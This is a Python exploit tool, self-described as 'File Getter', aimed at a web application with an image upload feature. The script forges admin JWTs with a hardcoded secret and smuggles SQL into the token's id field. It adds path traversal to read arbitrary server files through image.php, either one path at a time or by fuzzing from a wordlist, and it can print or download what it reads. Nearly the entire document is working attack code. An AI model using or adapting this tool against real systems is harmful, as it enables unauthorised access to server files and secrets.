import requests
import jwt
import re
import argparse
import time

##############################################
###################CONFIG#####################
URL = "ur url here"
filename_to_upload = "badfile.php"
file_content = "<?php phpinfo(); ?>"
user_id = 31337
is_public = 0

timeout = 2

login = "admin"
mail = "admin"
role = "admin"
ip = "127.0.0.1"
##############################################

url = f"{URL}/modules/upload.php"

files = {
    'image': ('badfile.php',file_content, 'image/jpeg')
}

def generate_token(id):
    encoded_jwt = jwt.encode({"id": f"{id}",
                              "login": f"{login}",
                              "mail": f"{mail}",
                              "role": f"{role}",
                              "ip": f"{ip}"},
                              "supersecret", algorithm="HS256")
    return encoded_jwt

def get_last_id():
    encoded_jwt = jwt.encode({"id": f'{user_id}',"login": "lol123",
                              "mail": "lol123",  "role": "admin",  "ip": "127.0.0.1"},
                              "supersecret", algorithm="HS256")
    req = requests.get(f"{URL}", headers={"Cookie": f"user_token={encoded_jwt}"})
    images = re.findall(r"image\.php\?id=[0-9]{1,7}",req.text)
    last_id = str(images[len(images)-1])[13:]
    return last_id


def interactive(jwt_print, file_print, file_download,add_path):
    print("=" * 50)
    print()
    while True:
        file = str(input('file > '))
        if add_path:
            file = "../../../../../.." + file
        encoded_jwt = generate_token(f"4), ('{file}', {is_public}, {user_id}")
        requests1 = requests.post(url, headers={"Cookie": f"user_token={encoded_jwt}"}, files=files)

        if "\"error\":false" in requests1.text:
            print(">>> File uploaded")
        else:
            print(">>> File not uploaded")
            break

        last_id = get_last_id()
        usual_jwt = generate_token(f'{user_id}')

        try:
            requests2 = requests.get(f'{URL}/image.php?id={last_id}',
                                     headers={'Cookie': f'user_token={usual_jwt}'}, timeout=timeout)
            if '403' in requests2.text:
                print('>>> File not found')
            else:
                print('>>> File exist!' + "\n")
                print(f'>>> URL: {URL}/image.php?id={last_id}' + "\n")

                if jwt_print:
                    print(f'>>> jwt: {usual_jwt}' + "\n")
                if file_print:
                    print(">"*10 + "   FILE CONTENT   " + "<"*10 + "\n")
                    print(requests2.text)
                    print(">"*19 + "<"*19 + "\n")
                if file_download:
                    print(">>> File downloaded" + "\n")
                    f = open(file.replace('/','').replace('.',''), 'w')
                    f.write(requests2.text)
                    f.close()

        except BaseException:
            print('>>> File exist but we don`t have permissions to read')
        print()

def fuzz(list,jwt_print, file_print, file_download,add_path):
    print("=" * 50)
    print()
    with open(list) as f:
        lines = f.readlines()
        lines = [line.rstrip() for line in lines]
        lines = [line for line in lines]
    for line in lines:
        if add_path:
            file = "../../../../../.." + line
        else:
            file = line
        encoded_jwt = generate_token(f"4), ('{file}', {is_public}, {user_id}")
        requests1 = requests.post(url, headers={"Cookie": f"user_token={encoded_jwt}"}, files=files)

        last_id = get_last_id()
        usual_jwt = generate_token(f'{user_id}')

        try:
            requests2 = requests.get(f'{URL}/image.php?id={last_id}',
                                     headers={'Cookie': f'user_token={usual_jwt}'}, timeout=timeout)
            if requests2.status_code == 503:
                print("503 error")

            elif '403' in requests2.text:
                pass
                print(f'>>> File {file} not found')

            elif len(requests2.text) > 1:
                print(f'>>> File {file} exist!' + "\n")
                print(f'>>> URL: {URL}/image.php?id={last_id}' + "\n")

                if jwt_print:
                    print(f'>>> jwt: {usual_jwt}' + "\n")
                if file_print:
                    print(">" * 10 + "   FILE CONTENT   " + "<" * 10 + "\n")
                    print(requests2.text)
                    print(">" * 19 + "<" * 19 + "\n")
                if file_download:
                    print(">>> File downloaded" + "\n")
                    f = open(file.replace('/', '').replace('.', ''), 'w')
                    f.write(requests2.text)
                    f.close()

        except BaseException:
            print(f'>>> File {file} exist but we don`t have permissions to read')
        #print()
        #time.sleep(0.5)








def print_banner():
    print("""
  ______ _ _         _____      _   _
 |  ____(_) |       / ____|    | | | |
 | |__   _| | ___  | |  __  ___| |_| |_ ___ _ __
 |  __| | | |/ _ \ | | |_ |/ _ \ __| __/ _ \ '__|
 | |    | | |  __/ | |__| |  __/ |_| ||  __/ |
 |_|    |_|_|\___|  \_____|\___|\__|\__\___|_|

  This tool was created to exploit Arbitrary File
  Reading via SQL injection.
  
  """)


help = """
          MODES:
                -interactive    
                -fuzz
          INTERACTIVE MODE
                VERBOSITY OPTIONS:      
                      -jwt            Prints JWT
                      -printFile      Prints file
                OTHER:
                      -download       Downloads file if it exists
          FUZZ MODE
                -addPath              Add path traversal "../../../../"
          -h                          Print this page
                                    
"""


parser = argparse.ArgumentParser(add_help=False)

parser.add_argument("-interactive",action="store_true")
parser.add_argument("-fuzz",default="")
parser.add_argument("-help",action="store_true")
parser.add_argument("-jwt",action="store_true")
parser.add_argument("-printFile", action="store_true")
parser.add_argument("-download", action="store_true")
parser.add_argument("-addPath", action="store_true")

args = parser.parse_args()
interactive_mode = args.interactive
fuzz_mode = args.fuzz
jwt_print = args.jwt
file_print = args.printFile
file_download = args.download
add_path = args.addPath
helpme = args.help

print_banner()

if (not (interactive_mode or fuzz_mode)) or helpme:
    print(help)
    quit()

if interactive_mode:
    interactive(jwt_print, file_print, file_download,add_path)

if fuzz_mode:
    fuzz(fuzz_mode,jwt_print, file_print, file_download,add_path)
